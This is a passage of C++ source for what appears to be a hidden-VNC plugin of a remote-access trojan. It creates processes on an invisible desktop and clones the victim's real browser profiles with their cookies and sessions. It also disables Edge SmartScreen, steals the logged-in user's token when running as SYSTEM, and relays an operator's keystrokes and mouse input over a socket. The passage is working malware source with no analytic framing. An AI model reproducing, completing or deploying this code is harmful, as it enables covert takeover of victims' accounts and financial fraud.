    CloseHandle(snap);

    if (rundll32Pids.empty()) return;

    EnumDesktopWindows(g_hHiddenDesktop, [](HWND hwnd, LPARAM lParam) -> BOOL {
        auto pSet = (std::set<DWORD>*)lParam;
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pSet->find(pid) != pSet->end()) {
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProc) {
                TerminateProcess(hProc, 0);
                CloseHandle(hProc);
            }
        }
        return TRUE;
    }, (LPARAM)&rundll32Pids);
}

static void SuppressMscoriesAsync(DWORD explorerPid) {
    std::thread([explorerPid]() {
        auto start = std::chrono::steady_clock::now();
        while (true) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start).count();
            if (elapsed >= 10) break;
            KillChildRundll32(explorerPid);
            KillRundll32OnHvncDesktop();
            std::this_thread::sleep_for(std::chrono::milliseconds(elapsed < 3 ? 80 : 400));
        }
    }).detach();
}

static void KillProcessTree(DWORD rootPid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    std::map<DWORD, std::vector<DWORD>> childMap;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            childMap[pe.th32ParentProcessID].push_back(pe.th32ProcessID);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    std::vector<DWORD> toKill;
    std::queue<DWORD> q;
    q.push(rootPid);
    while (!q.empty()) {
        DWORD pid = q.front();
        q.pop();
        toKill.push_back(pid);
        auto it = childMap.find(pid);
        if (it != childMap.end()) {
            for (DWORD kid : it->second) {
                q.push(kid);
            }
        }
    }

    for (int i = (int)toKill.size() - 1; i >= 0; i--) {
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, toKill[i]);
        if (h) {
            TerminateProcess(h, 0);
            CloseHandle(h);
        }
    }
}

static bool IsProcessAlive(DWORD pid) {
    if (pid == 0) return false;
    HANDLE h = OpenProcess(SYNCHRONIZE, FALSE, pid);
    if (!h) return false;
    CloseHandle(h);
    return true;
}

static void KillProcessByName(const string& exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    wstring wexeName(exeName.begin(), exeName.end());
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, wexeName.c_str()) == 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

typedef BOOL(WINAPI* pfnWTSQueryUserToken)(ULONG SessionId, PHANDLE phToken);

static HANDLE GetLaunchToken() {
    const DWORD PROCESS_QUERY_LIMITED = 0x1000;

    DWORD session = WTSGetActiveConsoleSessionId();
    if (session != 0xFFFFFFFF) {
        HMODULE hWts = LoadLibraryW(L"wtsapi32.dll");
        if (hWts) {
            auto WTSQueryUserToken = (pfnWTSQueryUserToken)GetProcAddress(hWts, "WTSQueryUserToken");
            if (WTSQueryUserToken) {
                HANDLE wtsToken = NULL;
                if (WTSQueryUserToken(session, &wtsToken)) {
                    HANDLE dup = NULL;
                    if (DuplicateTokenEx(wtsToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
                        CloseHandle(wtsToken);
                        FreeLibrary(hWts);
                        return dup;
                    }
                    CloseHandle(wtsToken);
                }
            }
            FreeLibrary(hWts);
        }
    }

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"explorer.exe") == 0) {
                HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED, FALSE, pe.th32ProcessID);
                if (hProc) {
                    HANDLE hTok = NULL;
                    if (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hTok)) {
                        CloseHandle(hProc);
                        HANDLE dup = NULL;
                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup)) {
                            CloseHandle(hTok);
                            CloseHandle(snap);
                            return dup;
                        }
                        CloseHandle(hTok);
                    } else {
                        CloseHandle(hProc);
                    }
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return NULL;
}

// -------------------------------------------------------------------------
//  Parallel Profile Copying Walkers & Launch Main
// -------------------------------------------------------------------------

static const std::set<wstring> g_skipProfileDirs = {
    L"Cache", L"Code Cache", L"GPUCache", L"ShaderCache", L"DawnCache",
    L"GrShaderCache", L"Snapshots", L"CrashReports", L"Crash Reports", L"Crashpad",
    L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
    L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
    L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
    L"cache2", L"startupCache", L"shader-cache", L"thumbnails", L"storage"
};

static void CollectFilePairs(const fs::path& src, const fs::path& dst, std::vector<std::pair<fs::path, fs::path>>& pairs) {
    if (!fs::exists(src)) return;
    try { fs::create_directories(dst); } catch (...) {}
    try {
        for (const auto& entry : fs::directory_iterator(src)) {
            fs::path p = entry.path();
            wstring name = p.filename().wstring();
            if (entry.is_directory()) {
                bool skip = false;
                for (const auto& s : g_skipProfileDirs) {
                    if (lstrcmpiW(name.c_str(), s.c_str()) == 0) {
                        skip = true;
                        break;
                    }
                }
                if (skip) continue;
                CollectFilePairs(p, dst / p.filename(), pairs);
            } else {
                pairs.push_back({p, dst / p.filename()});
            }
        }
    } catch (...) {}
}

static void CloneProfileWithProgress(const fs::path& src, const fs::path& dst, const string& label) {
    std::vector<std::pair<fs::path, fs::path>> pairs;
    CollectFilePairs(src, dst, pairs);
    int total = (int)pairs.size();
    if (total <= 0) {
        SendHvncProgress(100, label);
        return;
    }
    std::atomic<int> progress(0);
    std::atomic<bool> done(false);

    std::thread reporter([&progress, total, label, &done]() {
        while (!done) {
            int current = progress.load();
            int pct = (current * 99) / total;
            if (pct < 0) pct = 0;
            if (pct > 99) pct = 99;
            SendHvncProgress(pct, label);
            std::this_thread::sleep_for(std::chrono::milliseconds(150));
        }
    });

    int numThreads = 4;
    std::vector<std::thread> workers;
    std::atomic<size_t> index(0);

    for (int t = 0; t < numThreads; ++t) {
        workers.push_back(std::thread([&pairs, &index, &progress]() {
            while (true) {
                size_t idx = index.fetch_add(1);
                if (idx >= pairs.size()) break;
                try {
                    fs::copy_file(pairs[idx].first, pairs[idx].second, fs::copy_options::overwrite_existing);
                } catch (...) {}
                progress.fetch_add(1);
            }
        }));
    }

    for (auto& w : workers) {
        if (w.joinable()) w.join();
    }

    done = true;
    if (reporter.joinable()) reporter.join();
    SendHvncProgress(100, label);
}

class ThreadDesktopSwitcher {
    HDESK hPrev = NULL;
public:
    ThreadDesktopSwitcher(HDESK hNew) {
        hPrev = GetThreadDesktop(GetCurrentThreadId());
        if (hNew) {
            SetThreadDesktop(hNew);
        }
    }
    ~ThreadDesktopSwitcher() {
        if (hPrev) {
            SetThreadDesktop(hPrev);
        }
    }
};

static bool IsSystem() {
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        if (dwSize > 0) {
            std::vector<BYTE> buffer(dwSize);
            if (GetTokenInformation(hToken, TokenUser, buffer.data(), dwSize, &dwSize)) {
                PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();
                PSID pSystemSid = NULL;
                SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
                if (AllocateAndInitializeSid(&NtAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
                    BOOL isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
                    FreeSid(pSystemSid);
                    CloseHandle(hToken);
                    return isSystem == TRUE;
                }
            }
        }
        CloseHandle(hToken);
    }
    return false;
}

static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser = false) {
    if (!g_hHiddenDesktop) return;
    ThreadDesktopSwitcher switcher(g_hHiddenDesktop);
    try {
        wstring wRequestedPath(path.begin(), path.end());
        wstring exeName = L"";
        if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
        else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
        else if (wRequestedPath == L"Firefox") exeName = L"firefox.exe";
        else if (wRequestedPath == L"Waterfox") exeName = L"waterfox.exe";
        else if (wRequestedPath == L"LibreWolf") exeName = L"librewolf.exe";

        if (!exeName.empty()) {
            wstring exePath = get_app_path(exeName);
            if (exePath.empty()) {
                if (wRequestedPath == L"Firefox") {
                    exePath = L"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
                } else if (wRequestedPath == L"Waterfox") {
                    exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
                } else if (wRequestedPath == L"LibreWolf") {
                    exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
                } else if (wRequestedPath == L"Google Chrome") {
                    exePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
                } else if (wRequestedPath == L"Microsoft Edge") {
                    exePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
                    if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
                }
            }
            if (!exePath.empty()) {
                path = string(exePath.begin(), exePath.end());
            } else {
                path = string(exeName.begin(), exeName.end());
            }
        }

        // Expand environment variables
        if (path.find('%') != string::npos) {
            wchar_t wBuf[2048] = {0};
            wstring wPath(path.begin(), path.end());
            ExpandEnvironmentStringsW(wPath.c_str(), wBuf, 2048);
            wstring res(wBuf);
            path = string(res.begin(), res.end());
        }

        // Resolve wildcard glob
        if (path.find('*') != string::npos) {
            wstring wPath(path.begin(), path.end());
            wstring resolved = ResolveGlob(wPath);
            if (!resolved.empty()) {
                path = string(resolved.begin(), resolved.end());
            }
        }

        wstring wPath(path.begin(), path.end());

        // Alternate Program Files fallback
        if (!ExeExists(wPath)) {
            wstring alt = AltProgramFiles(wPath);
            if (!alt.empty() && ExeExists(alt)) {
                wPath = alt;
                path = string(wPath.begin(), wPath.end());
            }
        }

        // Portable search
        if (!ExeExists(wPath)) {
            size_t exeIdx = path.find(".exe");
            string exeStem = (exeIdx != string::npos) ? path.substr(0, exeIdx) : path;
            size_t slash = exeStem.find_last_of("\\/");
            if (slash != string::npos) exeStem = exeStem.substr(slash + 1);
            string exeFile = exeStem + ".exe";

            wchar_t userProfile[MAX_PATH] = {0};
            wchar_t localApp[MAX_PATH] = {0};
            GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
            GetEnvironmentVariableW(L"LOCALAPPDATA", localApp, MAX_PATH);

            std::vector<wstring> tryGlobs = {
                wstring(userProfile) + L"\\Downloads\\" + wstring(exeStem.begin(), exeStem.end()) + L"*\\" + wstring(exeFile.begin(), exeFile.end()),
                wstring(userProfile) + L"\\Desktop\\" + wstring(exeStem.begin(), exeStem.end()) + L"*\\" + wstring(exeFile.begin(), exeFile.end()),
                wstring(localApp) + L"\\" + wstring(exeStem.begin(), exeStem.end()) + L"*\\" + wstring(exeFile.begin(), exeFile.end())
            };
            for (const auto& g : tryGlobs) {
                wstring r = ResolveGlob(g);
                if (!r.empty()) {
                    wPath = r;
                    path = string(wPath.begin(), wPath.end());
                    break;
                }
            }
        }

        // Extract exe base name
        size_t exeEndIdx = path.find(".exe");
        string exeBase = (exeEndIdx != string::npos) ? path.substr(0, exeEndIdx + 4) : path;
        size_t slash = exeBase.find_last_of("\\/");
        if (slash != string::npos) exeBase = exeBase.substr(slash + 1);
        std::transform(exeBase.begin(), exeBase.end(), exeBase.begin(), ::tolower);

        string pidKey = exeBase;

        // Conflict check
        if (path.find("discord") != string::npos) {
            bool ownDiscord = false;
            {
                lock_guard<mutex> lock(g_pidsMutex);
                ownDiscord = g_launchedPids.count("discord.exe") || g_launchedPids.count("update.exe");
            }
            if (ownDiscord) KillProcessByName("discord.exe");
            {
                lock_guard<mutex> lock(g_pidsMutex);
                g_launchedPids.erase("discord.exe");
                g_launchedPids.erase("update.exe");
            }
        } else {
            bool isKillBefore = g_killBeforeLaunch.count(exeBase) > 0;
            if (isKillBefore) {
                bool own = false;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    own = g_launchedPids.count(exeBase) > 0;
                }
                if (own) KillProcessByName(exeBase);
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    g_launchedPids.erase(exeBase);
                }
            } else if (g_qtManyApps.count(exeBase)) {
                DWORD qtPid = 0;
                bool isAlive = false;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    if (g_launchedPids.count(exeBase)) {
                        qtPid = g_launchedPids[exeBase];
                        isAlive = IsProcessAlive(qtPid);
                    }
                }
                if (isAlive) {
                    send_status("'" + exeBase + "' already running in HVNC, skipping");
                    return;
                }
            } else if (!g_multiInstance.count(exeBase) && !g_chromiumBrowsers.count(exeBase) && exeBase != "firefox.exe") {
                DWORD existingPid = 0;
                bool isAlive = false;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    if (g_launchedPids.count(exeBase)) {
                        existingPid = g_launchedPids[exeBase];
                        isAlive = IsProcessAlive(existingPid);
                    }
                }
                if (isAlive) {
                    send_status("'" + exeBase + "' already running, skipping");
                    return;
                }
            }
        }

        wstring wDesktopNameAndWinSta = L"WinSta0\\" + g_desktopName;
        LPWSTR deskPtr = (LPWSTR)wDesktopNameAndWinSta.c_str();

        STARTUPINFOW si = { sizeof(si) };
        si.lpDesktop = deskPtr;
        si.dwFlags = STARTF_USEPOSITION | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOWNORMAL;

        string cmd = path;
        size_t exeEnd = path.find(".exe");
        if (exeEnd != string::npos && exeEnd + 4 < path.size() && path[exeEnd + 4] == ' ') {
            string exePart = path.substr(0, exeEnd + 4);
            string argsPart = path.substr(exeEnd + 5);
            cmd = "\"" + exePart + "\" " + argsPart;
        } else {
            if (path.find(' ') != string::npos) {
                cmd = "\"" + path + "\"";
            }
        }

        bool isConsoleApp = (exeBase == "cmd.exe" || exeBase == "powershell.exe" || exeBase == "pwsh.exe" || exeBase == "wscript.exe" || exeBase == "cscript.exe");

        if (g_chromiumBrowsers.count(exeBase)) {
            bool isOperaGX = (exeBase == "opera.exe" && path.find("Opera GX") != string::npos);
            if (isOperaGX) pidKey = "operagx.exe";

            size_t extIdx = exeBase.find(".exe");
            string hvncDirName = isOperaGX ? "operagx" : (extIdx != string::npos ? exeBase.substr(0, extIdx) : exeBase);
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            fs::path hvncProfile = fs::path(tempPath) / L"SeroHvnc" / wstring(hvncDirName.begin(), hvncDirName.end());

            wstring wRealProfile = L"";
            if (!isOperaGX) {
                wRealProfile = GetChromiumRealProfile(wstring(exeBase.begin(), exeBase.end()));
            } else {
                wchar_t appData[MAX_PATH];
                SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
                wRealProfile = wstring(appData) + L"\\Opera Software\\Opera GX Stable";
            }

            if (cloneBrowser && !wRealProfile.empty() && fs::exists(wRealProfile)) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                try { if (fs::exists(hvncProfile)) fs::remove_all(hvncProfile); } catch (...) {}
                CloneProfileWithProgress(wRealProfile, hvncProfile, "Cloning " + hvncDirName + "...");
            } else {
                DWORD oldPid = 0;
                bool isAlive = false;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    if (g_launchedPids.count(pidKey)) {
                        oldPid = g_launchedPids[pidKey];
                        isAlive = IsProcessAlive(oldPid);
                    }
                }
                if (isAlive) {
                    KillProcessTree(oldPid);
                    {
                        lock_guard<mutex> lock(g_pidsMutex);
                        g_launchedPids.erase(pidKey);
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                }
                try { fs::create_directories(hvncProfile); } catch (...) {}
                if (cloneBrowser) SendHvncProgress(100, "");
            }

            for (const auto& lk : {L"SingletonLock", L"SingletonSocket", L"SingletonCookie"}) {
                try { fs::remove(hvncProfile / lk); } catch (...) {}
                try { fs::remove(hvncProfile / L"Default" / lk); } catch (...) {}
            }

            // Strip existing --user-data-dir
            size_t ui = cmd.find("--user-data-dir=");
            if (ui != string::npos) {
                size_t ei = ui + 16;
                if (ei < cmd.size() && cmd[ei] == '"') {
                    ei++;
                    while (ei < cmd.size() && cmd[ei] != '"') ei++;
                    if (ei < cmd.size()) ei++;
                } else {
                    while (ei < cmd.size() && cmd[ei] != ' ') ei++;
                }
                cmd = cmd.substr(0, ui) + (ei < cmd.size() ? cmd.substr(ei) : "");
                // trim
                size_t start = cmd.find_first_not_of(" \t\r\n");
                size_t end = cmd.find_last_not_of(" \t\r\n");
                if (start != string::npos && end != string::npos) {
                    cmd = cmd.substr(start, end - start + 1);
                } else {
                    cmd = "";
                }
            }

            string hvncProfileStr = string(hvncProfile.wstring().begin(), hvncProfile.wstring().end());

            cmd += " --user-data-dir=\"" + hvncProfileStr + "\"" +
                   " --start-maximized" +
                   " --no-first-run --no-default-browser-check --disable-default-apps" +
                   " --disable-background-mode --disable-background-networking" +
                   " --noerrdialogs --disable-session-crashed-bubble" +
                   " --disable-restore-session-state --disable-crash-reporter" +
                   " --no-recovery-component";
            if (exeBase == "msedge.exe") {
                cmd += " --disable-features=msEdgeRecovery,msSmartScreenProtection"
                       " --disable-sync --hide-crash-restore-bubble";
            }
            if (exeBase == "opera.exe") {
                cmd += " --disable-features=OperaCrashRestoreSession";
            }
        } else if (g_qtManyApps.count(exeBase)) {
            cmd += " -many";
        } else if (exeBase == "firefox.exe") {
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            fs::path hvncProfile = fs::path(tempPath) / L"SeroHvnc" / L"firefox";

            wstring wRealProfile = GetFirefoxRealProfile();
            if (cloneBrowser && !wRealProfile.empty() && fs::exists(wRealProfile)) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                try { if (fs::exists(hvncProfile)) fs::remove_all(hvncProfile); } catch (...) {}
                CloneProfileWithProgress(wRealProfile, hvncProfile, "Cloning firefox...");
            } else {
                DWORD oldPid = 0;
                bool isAlive = false;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    if (g_launchedPids.count("firefox.exe")) {
                        oldPid = g_launchedPids["firefox.exe"];
                        isAlive = IsProcessAlive(oldPid);
                    }
                }
                if (isAlive) {
                    KillProcessTree(oldPid);
                    {
                        lock_guard<mutex> lock(g_pidsMutex);
                        g_launchedPids.erase("firefox.exe");
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                }
                try { fs::create_directories(hvncProfile); } catch (...) {}
                if (cloneBrowser) SendHvncProgress(100, "");
            }

            for (const auto& lk : {L"parent.lock", L"lock"}) {
                try { fs::remove(hvncProfile / lk); } catch (...) {}
            }

            if (!cmd.empty() && cmd[0] == '"') {
                size_t closeQ = cmd.find('"', 1);
                if (closeQ != string::npos) cmd = cmd.substr(0, closeQ + 1);
            } else {
                size_t sp = cmd.find(' ');
                if (sp != string::npos) cmd = cmd.substr(0, sp);
            }
            string hvncProfileStr(hvncProfile.wstring().begin(), hvncProfile.wstring().end());
            cmd += " -profile \"" + hvncProfileStr + "\" -no-remote";
        }

        if (exeBase == "opera.exe") {
            RepairOperaProfileAfterHvnc();
        }

        wstring wCmd(cmd.begin(), cmd.end());
        std::vector<wchar_t> cmdLine(wCmd.begin(), wCmd.end());
        cmdLine.push_back(L'\0');

        uint32_t createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
        HANDLE launchToken = NULL;
        if (IsSystem()) {
            launchToken = GetLaunchToken();
        }
        LPVOID envBlock = nullptr;
        if (launchToken) {
            typedef BOOL(WINAPI* pfnCreateEnvironmentBlock)(LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);
            HMODULE hUserEnv = LoadLibraryW(L"userenv.dll");
            if (hUserEnv) {
                auto CreateEnvironmentBlock = (pfnCreateEnvironmentBlock)GetProcAddress(hUserEnv, "CreateEnvironmentBlock");
                if (CreateEnvironmentBlock) {
                    CreateEnvironmentBlock(&envBlock, launchToken, FALSE);
                }
                FreeLibrary(hUserEnv);
            }
        }

        PROCESS_INFORMATION pi = {0};
        BOOL success = FALSE;

        if (launchToken) {
            success = CreateProcessAsUserW(launchToken, NULL, cmdLine.data(), NULL, NULL, FALSE, createFlags, envBlock, NULL, &si, &pi);
        } else {
            success = CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, createFlags, NULL, NULL, &si, &pi);
        }

        if (envBlock) {
            typedef BOOL(WINAPI* pfnDestroyEnvironmentBlock)(LPVOID lpEnvironment);
            HMODULE hUserEnv = LoadLibraryW(L"userenv.dll");
            if (hUserEnv) {
                auto DestroyEnvironmentBlock = (pfnDestroyEnvironmentBlock)GetProcAddress(hUserEnv, "DestroyEnvironmentBlock");
                if (DestroyEnvironmentBlock) DestroyEnvironmentBlock(envBlock);
                FreeLibrary(hUserEnv);
            }
        }
        if (launchToken) CloseHandle(launchToken);

        if (success) {
            send_status("LaunchOnDesktop '" + path + "' pid=" + to_string(pi.dwProcessId));
            {
                lock_guard<mutex> lock(g_pidsMutex);
                g_launchedPids[pidKey] = pi.dwProcessId;
            }
            if (exeBase == "opera.exe") PatchCursorInfoAsync(pi.dwProcessId);
            if (exeBase == "explorer.exe") SuppressMscoriesAsync(pi.dwProcessId);

            if (!isRetry && (exeBase == "msedge.exe" || exeBase == "explorer.exe")) {
                DWORD rPid = pi.dwProcessId;
                string rBase = exeBase;
                string rPath = path;
                bool rClone = cloneBrowser;
                std::thread([rPid, rBase, rPath, rClone]() {
                    std::this_thread::sleep_for(std::chrono::milliseconds(3000));
                    if (!g_hHiddenDesktop || IsProcessAlive(rPid)) return;
                    {
                        lock_guard<mutex> lock(g_pidsMutex);
                        g_launchedPids.erase(rBase);
                    }
                    LaunchOnDesktop(rPath, true, rClone);
                }).detach();
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            send_error("Failed to start process. Error: " + to_string(GetLastError()));
        }
    } catch (const std::exception& e) {
        send_error("LaunchOnDesktop exception: " + string(e.what()));
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    initialize_visual_styles();
    g_socket = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json cmd = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;
        initialize_visual_styles();

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);

            if (!g_captureRunning && !g_encodeRunning && !g_sendRunning) {
                g_captureQueue.clear();
                g_sendQueue.clear();
            }
            if (!g_sendRunning.exchange(true)) {
                if (g_sendThread.joinable()) g_sendThread.join();
                g_sendThread = thread(send_worker);
            }
            if (!g_encodeRunning.exchange(true)) {
                if (g_encodeThread.joinable()) g_encodeThread.join();
                g_encodeThread = thread(encode_worker);
            }
            if (!g_captureRunning.exchange(true)) {
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            if (!g_inputRunning.exchange(true)) {
                if (g_inputThread.joinable()) g_inputThread.join();
                g_inputThread = thread(input_loop);
            }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            g_encodeRunning  = false;
            g_sendRunning    = false;
            g_inputRunning   = false;
            g_frameCV.notify_all();
            g_sendCV.notify_all();
            g_inputCV.notify_all();

            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_encodeThread.joinable())  g_encodeThread.join();
            if (g_sendThread.joinable())    g_sendThread.join();
            if (g_inputThread.joinable())   g_inputThread.join();

            FreeWinCache();

            g_movingWindow = false;
            g_movingHwnd = NULL;
            g_captionFwdHwnd = NULL;
            g_lbDownHwnd = NULL;
            g_leftButtonDown = false;
            g_lastLeftMs = 0;
            g_lastClickX = 0; g_lastClickY = 0;
            g_shiftDown = g_ctrlDown = g_altDown = g_capsLock = false;

            // Kill browsers and clean profiles gracefully on session stop
            std::thread([]() {
                // Collect and close processes launched
                std::vector<DWORD> pids;
                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    for (auto& pair : g_launchedPids) {
                        pids.push_back(pair.second);
                    }
                }

                // Graceful WM_CLOSE first
                EnumDesktopWindows(g_hHiddenDesktop, [](HWND hwnd, LPARAM) -> BOOL {
                    PostMessageW(hwnd, WM_CLOSE, 0, 0);
                    return TRUE;
                }, 0);

                std::this_thread::sleep_for(std::chrono::milliseconds(1500));

                for (DWORD pid : pids) {
                    KillProcessTree(pid);
                }

                {
                    lock_guard<mutex> lock(g_pidsMutex);
                    g_launchedPids.clear();
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(300));
                CleanChromiumHvncLocks();
                RepairOperaProfileAfterHvnc();
                CleanRealBrowserLock({L"Microsoft", L"Edge", L"User Data"});
                CleanRealBrowserLock({L"Google", L"Chrome", L"User Data"});
                CleanRealBrowserLock({L"BraveSoftware", L"Brave-Browser", L"User Data"});
                CleanRealBrowserLock({L"Vivaldi", L"User Data"});
                CleanRealBrowserLock({L"Chromium", L"User Data"});
                CleanFirefoxRealLocks();
            }).detach();

        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);
        } else if (action == "hvnc_run") {
            string path = cmd.value("path", "cmd.exe");
            bool clone = cmd.value("copy_profile", false);
            std::thread([path, clone]() {
                LaunchOnDesktop(path, false, clone);
            }).detach();
        } else if (action == "hvnc_mousemove") {
            lock_guard<mutex> lock(g_inputMutex);
            InputTask task;
            task.action = "hvnc_mousemove";
            task.cmd = cmd;

            // Prevent queue saturation by consolidating mousemovements
            if (!g_inputQueue.empty() && g_inputQueue.back().action == "hvnc_mousemove") {
                g_inputQueue.pop_back();
            }
            while (g_inputQueue.size() > 128) {
                g_inputQueue.pop_front();
            }
            g_inputQueue.push_back(task);
            g_inputCV.notify_one();
        } else if (action == "hvnc_mousedown" || action == "hvnc_mouseup" || action == "hvnc_doubleclick" ||
                   action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            lock_guard<mutex> lock(g_inputMutex);
            InputTask task;
            task.action = action;
            task.cmd = cmd;
            while (g_inputQueue.size() > 128) {
                g_inputQueue.pop_front();
            }
            g_inputQueue.push_back(task);
            g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false;
        g_encodeRunning  = false;
        g_sendRunning    = false;
        g_inputRunning   = false;
        g_frameCV.notify_all();
        g_sendCV.notify_all();
        g_inputCV.notify_all();
    }
    return TRUE;
}
